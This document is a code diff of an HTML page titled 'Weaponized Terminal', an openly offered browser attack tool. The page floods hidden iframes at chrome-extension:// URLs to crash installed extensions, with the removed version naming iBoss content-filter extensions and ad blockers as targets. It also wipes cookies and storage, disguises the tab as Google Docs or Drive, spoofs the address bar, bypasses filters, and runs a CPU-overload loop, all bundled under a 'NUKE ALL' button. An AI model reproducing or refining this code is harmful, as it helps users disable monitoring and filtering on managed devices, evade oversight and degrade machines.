@@ -1,295 +1,278 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Ronan is the SIGMA</title>
-  <style>
+<meta charset="UTF-8">
+<title>⚡ Weaponized Terminal ⚡</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
     body {
-      margin: 0; padding: 0;
-      background: #000; color: #0f0;
-      font-family: monospace;
-      transition: background 0.3s, color 0.3s;
+        margin: 0;
+        background: #000;
+        color: #00FF00;
+        font-family: 'Courier New', Courier, monospace;
+        overflow-x: hidden;
     }
-    .container { max-width: 1000px; margin: auto; padding: 20px; }
-    .header { display: flex; background: #111; }
-    .tablink {
-      flex: 1;
-      background: #111; color: #0f0;
-      border: none; padding: 10px; cursor: pointer;
+    #terminal {
+        padding: 20px;
     }
-    .tablink.active { background: #0f0; color: #000; }
-    .tabcontent { display: none; padding: 20px; }
-    label, input, select, button, textarea {
-      width: 100%; margin-top: 10px; padding: 8px;
-      background: #222; color: #0f0; border: 1px solid #0f0; border-radius: 5px;
+    .prompt {
+        color: #0f0;
+        font-weight: bold;
     }
-    button { font-weight: bold; cursor: pointer; }
-    button:hover { background: #0c0; }
-    #safeExitBtn {
-      background: #f00; color: #fff; padding: 10px; margin: 20px 0; border: none; border-radius: 5px;
-      width: 100%;
+    input, select, button, textarea {
+        background: #000;
+        color: #0f0;
+        border: 1px solid #0f0;
+        padding: 5px;
+        margin: 5px 0;
+        width: 100%;
+        font-family: 'Courier New', Courier, monospace;
     }
-    .scrollable { max-height: 200px; overflow-y: auto; margin-bottom: 10px; }
-    .status { text-align: center; margin-top: 10px; font-weight: bold; }
-    .checkbox-list { display: flex; flex-direction: column; }
-    .checkbox-list label { display: flex; align-items: center; }
-    .checkbox-list input[type="checkbox"] { width: auto; margin-right: 10px; }
-  </style>
+    button {
+        font-weight: bold;
+        cursor: pointer;
+    }
+    button:hover {
+        background: #0f0;
+        color: #000;
+    }
+    .hidden {
+        display: none;
+    }
+    iframe {
+        position: absolute;
+        width: 1px;
+        height: 1px;
+        opacity: 0;
+        pointer-events: none;
+    }
+    .section {
+        margin-top: 20px;
+        padding: 10px;
+        border: 1px dashed #0f0;
+    }
+</style>
 </head>
 <body>
 
-<div class="header">
-  <button class="tablink active" onclick="openTab(event, 'main')">Main Attack</button>
-  <button class="tablink" onclick="openTab(event, 'history')">History Cleaner</button>
-  <button class="tablink" onclick="openTab(event, 'cloak')">Cloak</button>
-  <button class="tablink" onclick="openTab(event, 'advanced')">Advanced Tools</button>
-</div>
+<div id="terminal">
+    <div id="bootSequence"></div>
+    <div id="mainMenu" class="hidden">
+        <div class="prompt">Select Your Weapon:</div>
+        <button onclick="openSection('attack')">[1] Extension Flood & Bug</button>
+        <button onclick="openSection('history')">[2] History Nuker</button>
+        <button onclick="openSection('cloak')">[3] Cloak & Fake URL</button>
+        <button onclick="openSection('unblock')">[4] Tab Unblocker</button>
+        <button onclick="openSection('overload')">[5] CPU Overload</button>
+        <button onclick="nukeAll()">[6] NUKE ALL</button>
+        <button onclick="safeExit()">[X] Safe Exit</button>
+    </div>
 
-<div id="main" class="tabcontent" style="display:block;">
-  <div class="container">
-    <h2>Main Extension Bugger</h2>
+    <div id="attack" class="section hidden">
+        <div class="prompt">Extension Flood & Bugging</div>
+        <textarea id="attackUrls" placeholder="Enter Target URLs (comma separated)">https://example.com</textarea>
+        <input type="number" id="iframeCount" placeholder="Iframes per Cycle" value="100">
+        <input type="number" id="iframeDelay" placeholder="Delay Between Waves (ms)" value="50">
+        <select id="floodMode">
+            <option value="turbo">Turbo</option>
+            <option value="aggressive">Aggressive</option>
+            <option value="silent">Silent Hidden</option>
+        </select>
+        <textarea id="manualExtensions" placeholder="Enter Extension IDs (one per line)"></textarea>
+        <button onclick="startFlood()">Start Attack</button>
+        <button onclick="stopFlood()">Stop Attack</button>
+        <div id="attackStatus" class="prompt">Status: Idle</div>
+    </div>
 
-    <label>Attack Target URLs (comma-separated)</label>
-    <textarea id="attackUrls">https://example.com,https://another-example.com</textarea>
+    <div id="history" class="section hidden">
+        <div class="prompt">History Nuker</div>
+        <button onclick="startHistoryWipe()">Start Wipe</button>
+        <button onclick="stopHistoryWipe()">Stop Wipe</button>
+        <div id="historyStatus" class="prompt">Status: Idle</div>
+    </div>
 
-    <label>Number of Iframes per Cycle</label>
-    <input type="number" id="iframeCount" value="100" min="1">
+    <div id="cloak" class="section hidden">
+        <div class="prompt">Cloaking & URL Spoof</div>
+        <select id="cloakType">
+            <option value="docs">Google Docs</option>
+            <option value="drive">Google Drive</option>
+            <option value="calc">Calculator</option>
+            <option value="custom">Custom</option>
+        </select>
+        <input type="text" id="cloakCustom" placeholder="Custom Title/URL (if selected)">
+        <button onclick="applyCloak()">Apply Cloak</button>
+    </div>
 
-    <label>Delay Between Waves (ms)</label>
-    <input type="number" id="iframeDelay" value="50" min="0">
+    <div id="unblock" class="section hidden">
+        <div class="prompt">Tab Unblocker (Bypass Filters)</div>
+        <button onclick="launchUnblocker()">Launch Unblocker</button>
+    </div>
 
-    <label>Flood Mode</label>
-    <select id="floodMode">
-      <option value="turbo">Turbo Mode</option>
-      <option value="aggressive">Aggressive</option>
-      <option value="silent">Silent Hidden</option>
-    </select>
-
-    <label>Extension IDs to Target</label>
-    <div class="scrollable checkbox-list" id="extensionList"></div>
-
-    <button onclick="scanExtensions()">Scan Installed Extensions</button>
-    <input type="text" id="manualExtensionId" placeholder="Manual Add Extension ID">
-    <button onclick="addManualExtension()">Add Manual Extension</button>
-
-    <label><input type="checkbox" id="randomizeUrls" checked> Randomize URLs per Cycle</label>
-    <label><input type="checkbox" id="autoReload" > Auto Reload on Kill</label>
-
-    <button onclick="startFlood()">Start Attack</button>
-    <button onclick="stopFlood()">Stop Attack</button>
-
-    <div class="status" id="statusMain">Status: Idle</div>
-    <button id="safeExitBtn" onclick="safeExit()">Safe Exit</button>
-  </div>
-</div>
-
-<div id="history" class="tabcontent">
-  <div class="container">
-    <h2>History Nuker</h2>
-    <button onclick="startHistoryWipe()">Start Wipe</button>
-    <button onclick="stopHistoryWipe()">Stop Wipe</button>
-    <div class="status" id="statusHistory">Status: Idle</div>
-  </div>
-</div>
-
-<div id="cloak" class="tabcontent">
-  <div class="container">
-    <h2>Cloak Settings</h2>
-    <label>Choose Cloak</label>
-    <select id="cloakType">
-      <option value="docs">Fake Google Docs</option>
-      <option value="drive">Fake Google Drive</option>
-      <option value="calc">Fake Calculator</option>
-      <option value="notepad">Fake Notepad</option>
-      <option value="blank">Blank Page</option>
-      <option value="custom">Custom URL</option>
-    </select>
-    <input type="text" id="cloakCustomUrl" placeholder="Custom URL (if selected)">
-    <button onclick="applyCloak()">Apply Cloak</button>
-  </div>
-</div>
-
-<div id="advanced" class="tabcontent">
-  <div class="container">
-    <h2>Advanced Settings</h2>
-    <button onclick="toggleTheme()">Toggle Dark/Light Mode</button>
-    <button onclick="fetchSurfTargets()">Fetch Good Target URLs</button>
-    <div class="status" id="surfStatus">Surf Targets: 0 Loaded</div>
-  </div>
+    <div id="overload" class="section hidden">
+        <div class="prompt">CPU Overload</div>
+        <button onclick="startOverload()">Start CPU Crash</button>
+        <button onclick="stopOverload()">Stop CPU Crash</button>
+        <div id="overloadStatus" class="prompt">Status: Idle</div>
+    </div>
 </div>
 
 <script>
-let floodInterval, historyInterval, attackUrls = [], proxies = [], extensions = {}, flooding = false;
-let isDark = true;
+let floodInterval, iframeCount = 100, iframeDelay = 50, floodMode = 'turbo', attackUrls = [], manualExtensions = [], overloadInterval;
+let historyInterval;
 
-// --- Tabs ---
-function openTab(evt, tabName) {
-  document.querySelectorAll('.tabcontent').forEach(t => t.style.display = 'none');
-  document.querySelectorAll('.tablink').forEach(t => t.classList.remove('active'));
-  document.getElementById(tabName).style.display = 'block';
-  evt.currentTarget.classList.add('active');
+// Terminal boot effect
+const bootLines = [
+    "Initializing Weaponized Terminal...",
+    "Loading core modules...",
+    "Loading extension flooding systems...",
+    "Loading iframe bombardment engine...",
+    "Loading cloaking and spoofing protocols...",
+    "Finalizing build...",
+    "Ready."
+];
+
+let currentLine = 0;
+function bootSequence() {
+    if (currentLine < bootLines.length) {
+        document.getElementById('bootSequence').innerHTML += `<div>> ${bootLines[currentLine]}</div>`;
+        currentLine++;
+        setTimeout(bootSequence, 500);
+    } else {
+        document.getElementById('mainMenu').classList.remove('hidden');
+    }
+}
+bootSequence();
+
+function openSection(id) {
+    document.querySelectorAll('.section').forEach(sec => sec.classList.add('hidden'));
+    document.getElementById(id).classList.remove('hidden');
 }
 
-// --- Flood Functions ---
 function startFlood() {
-  if (flooding) return;
-  flooding = true;
-  attackUrls = document.getElementById('attackUrls').value.split(',').map(u=>u.trim()).filter(u=>u);
-  const delay = +document.getElementById('iframeDelay').value;
-  const mode = document.getElementById('floodMode').value;
-  const extIds = [...document.querySelectorAll('#extensionList input:checked')].map(c=>c.value);
-  if (!attackUrls.length || !extIds.length) { alert('Please input URLs and select extensions!'); flooding = false; return; }
-  document.getElementById('statusMain').innerText = 'Status: Flooding…';
-  floodInterval = setInterval(()=>{
-    let targetUrl = document.getElementById('randomizeUrls').checked ?
-      attackUrls[Math.floor(Math.random()*attackUrls.length)] : attackUrls[0];
-    spawnIframe(targetUrl, mode);
-    extIds.forEach(id => spawnExtIframe(id));
-  }, delay);
+    stopFlood();
+    iframeCount = +document.getElementById('iframeCount').value;
+    iframeDelay = +document.getElementById('iframeDelay').value;
+    floodMode = document.getElementById('floodMode').value;
+    attackUrls = document.getElementById('attackUrls').value.split(',').map(x=>x.trim());
+    manualExtensions = document.getElementById('manualExtensions').value.split('\n').map(x=>x.trim()).filter(x=>x);
+
+    document.getElementById('attackStatus').innerText = 'Status: Flooding...';
+
+    floodInterval = setInterval(()=>{
+        attackUrls.forEach(url => spawnIframe(url));
+        manualExtensions.forEach(id => spawnExtIframe(id));
+    }, iframeDelay);
 }
 
 function stopFlood() {
-  clearInterval(floodInterval);
-  flooding = false;
-  document.getElementById('statusMain').innerText = 'Status: Idle';
+    clearInterval(floodInterval);
+    document.getElementById('attackStatus').innerText = 'Status: Idle';
 }
 
-function spawnIframe(url, mode) {
-  const iframe = document.createElement('iframe');
-  iframe.src = url + "?rand=" + Math.random();
-  iframe.style.border = "none";
-  iframe.style.position = "absolute";
-  iframe.style.width = mode === "turbo" ? "100%" : (mode === "aggressive" ? "10px" : "1px");
-  iframe.style.height = mode === "turbo" ? "100%" : (mode === "aggressive" ? "10px" : "1px");
-  iframe.style.visibility = mode === "silent" ? "hidden" : "visible";
-  document.body.appendChild(iframe);
-  setTimeout(() => iframe.remove(), 1000);
+function spawnIframe(url) {
+    const iframe = document.createElement('iframe');
+    iframe.src = url + "?rand=" + Math.random();
+    iframe.style.width = (floodMode === "turbo") ? "100%" : (floodMode === "aggressive" ? "10px" : "1px");
+    iframe.style.height = (floodMode === "turbo") ? "100%" : (floodMode === "aggressive" ? "10px" : "1px");
+    iframe.style.visibility = (floodMode === "silent") ? "hidden" : "visible";
+    document.body.appendChild(iframe);
+    setTimeout(()=>iframe.remove(), 1000);
 }
 
 function spawnExtIframe(id) {
-  const iframe = document.createElement('iframe');
-  iframe.src = `chrome-extension://${id}/`;
-  iframe.style.display = 'none';
-  document.body.appendChild(iframe);
-  setTimeout(() => iframe.remove(), 1000);
+    const iframe = document.createElement('iframe');
+    iframe.src = `chrome-extension://${id}/`;
+    document.body.appendChild(iframe);
+    setTimeout(()=>iframe.remove(), 1000);
 }
 
-// --- Extension List ---
-function scanExtensions() {
-  const defaultExt = {
-    "gighmmpiobklfepjocnamgkkbiglidom":"AdBlock",
-    "cfhdojbkjhnklbpkdaibdccddilifddb":"Adblock Plus",
-    "nkeimhogjdpnpccoofpliimaahmaaome":"Grammarly",
-    "ibnejdfjmmkpcnlpebklmnkoeoihofec":"uBlock Origin",
-    "lfnaojkojhopbjbpmloofpnjkcjnkddd":"IbossClient",
-    "kmffehbidlalibfeklaefnckpidbodff":"Iboss Extension 1",
-    "oejigobjchedidhlafnpdpccihgbmbka":"Iboss Extension 2"
-  };
-  extensions = { ...extensions, ...defaultExt };
-  populateExtensionList();
-}
-
-function populateExtensionList() {
-  const list = document.getElementById('extensionList');
-  list.innerHTML = '';
-  for (let id in extensions) {
-    const label = document.createElement('label');
-    label.innerHTML = `<input type="checkbox" value="${id}" checked> ${extensions[id]} (${id})`;
-    list.appendChild(label);
-  }
-}
-
-function addManualExtension() {
-  const id = document.getElementById('manualExtensionId').value.trim();
-  if (id) {
-    extensions[id] = 'Manual Extension';
-    populateExtensionList();
-    document.getElementById('manualExtensionId').value = '';
-  }
-}
-
-// --- Safe Exit ---
-function safeExit() {
-  stopFlood();
-  stopHistoryWipe();
-  document.querySelectorAll('iframe').forEach(f => f.remove());
-  if (document.getElementById('autoReload').checked) window.location.reload();
-}
-
-// --- History Wipe ---
 function startHistoryWipe() {
-  stopHistoryWipe();
-  document.getElementById('statusHistory').innerText = 'Status: Wiping…';
-  clearData();
-  historyInterval = setInterval(clearData, 1000);
+    stopHistoryWipe();
+    historyInterval = setInterval(clearHistory, 1000);
+    document.getElementById('historyStatus').innerText = 'Status: Wiping...';
 }
 
 function stopHistoryWipe() {
-  clearInterval(historyInterval);
-  document.getElementById('statusHistory').innerText = 'Status: Idle';
+    clearInterval(historyInterval);
+    document.getElementById('historyStatus').innerText = 'Status: Idle';
 }
 
-function clearData() {
-  try {
+function clearHistory() {
     localStorage.clear();
     sessionStorage.clear();
-    document.cookie.split(";").forEach(c => {
-      document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=Thu,01 Jan 1970 00:00:00 GMT;path=/");
+    document.cookie.split(";").forEach(c=>{
+        document.cookie = c.replace(/^ +/,"").replace(/=.*/,"=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/");
     });
-    if (chrome.browsingData) {
-      chrome.browsingData.remove({}, {history:true, cache:true, cookies:true, localStorage:true}, ()=>{});
-    }
-  } catch(e){}
-  const iframe = document.createElement('iframe');
-  iframe.src = 'chrome://settings/clearBrowserData';
-  iframe.style.display = 'none';
-  document.body.appendChild(iframe);
-  setTimeout(()=>iframe.remove(), 1000);
 }
 
-// --- Cloak ---
 function applyCloak() {
-  const type = document.getElementById('cloakType').value;
-  const custom = document.getElementById('cloakCustomUrl').value;
-  let title = 'Untitled';
-  let favicon = '';
+    const type = document.getElementById('cloakType').value;
+    const custom = document.getElementById('cloakCustom').value.trim();
+    let title = 'Untitled';
+    let favicon = '';
 
-  switch(type) {
-    case 'docs': title = 'Google Docs'; favicon='https://ssl.gstatic.com/docs/doclist/images/mediatype/icon_1_document_x16.png'; break;
-    case 'drive': title = 'Google Drive'; favicon='https://ssl.gstatic.com/images/branding/product/1x/drive_2020q4_48dp.png'; break;
-    case 'calc': title = 'Calculator'; favicon='https://ssl.gstatic.com/classroom/ic_product_calculator_48.png'; break;
-    case 'notepad': title = 'Notepad'; break;
-    case 'blank': title = 'Blank'; break;
-    case 'custom': title = custom; break;
-  }
-  document.title = title;
-  const link = document.createElement('link');
-  link.rel = 'icon';
-  link.href = favicon;
-  document.head.appendChild(link);
+    switch(type) {
+        case 'docs':
+            title = 'Google Docs';
+            favicon = 'https://ssl.gstatic.com/docs/doclist/images/mediatype/icon_1_document_x16.png';
+            break;
+        case 'drive':
+            title = 'Google Drive';
+            favicon = 'https://ssl.gstatic.com/images/branding/product/1x/drive_2020q4_48dp.png';
+            break;
+        case 'calc':
+            title = 'Calculator';
+            favicon = 'https://ssl.gstatic.com/classroom/ic_product_calculator_48.png';
+            break;
+        case 'custom':
+            title = custom || 'Custom';
+            break;
+    }
+    document.title = title;
+    const link = document.createElement('link');
+    link.rel = 'icon';
+    link.href = favicon || '';
+    document.head.appendChild(link);
+
+    if (type === 'custom' && custom) {
+        history.pushState({}, '', custom);
+    }
 }
 
-// --- Advanced Surf Fetch ---
-function fetchSurfTargets() {
-  attackUrls.push('https://bing.com', 'https://duckduckgo.com', 'https://wikipedia.org', 'https://yahoo.com');
-  document.getElementById('surfStatus').innerText = `Surf Targets: ${attackUrls.length} Loaded`;
+function launchUnblocker() {
+    const win = window.open('https://bing.com', '_blank');
+    win.blur();
+    window.focus();
 }
 
-// --- Theme ---
-function toggleTheme() {
-  if (isDark) {
-    document.body.style.background = '#fff';
-    document.body.style.color = '#000';
-  } else {
-    document.body.style.background = '#000';
-    document.body.style.color = '#0f0';
-  }
-  isDark = !isDark;
+function startOverload() {
+    overloadInterval = setInterval(()=>{
+        for (let i=0; i<100; i++) {
+            Math.random()*Math.random();
+        }
+    },1);
+    document.getElementById('overloadStatus').innerText = 'Status: Overloading CPU...';
 }
 
-// --- Init ---
-scanExtensions();
+function stopOverload() {
+    clearInterval(overloadInterval);
+    document.getElementById('overloadStatus').innerText = 'Status: Idle';
+}
+
+function nukeAll() {
+    startFlood();
+    startHistoryWipe();
+    startOverload();
+    alert('NUKE ALL ACTIVATED');
+}
+
+function safeExit() {
+    stopFlood();
+    stopHistoryWipe();
+    stopOverload();
+    document.querySelectorAll('iframe').forEach(f=>f.remove());
+    alert('Safe Exit Complete.');
+}
 </script>
 
 </body>
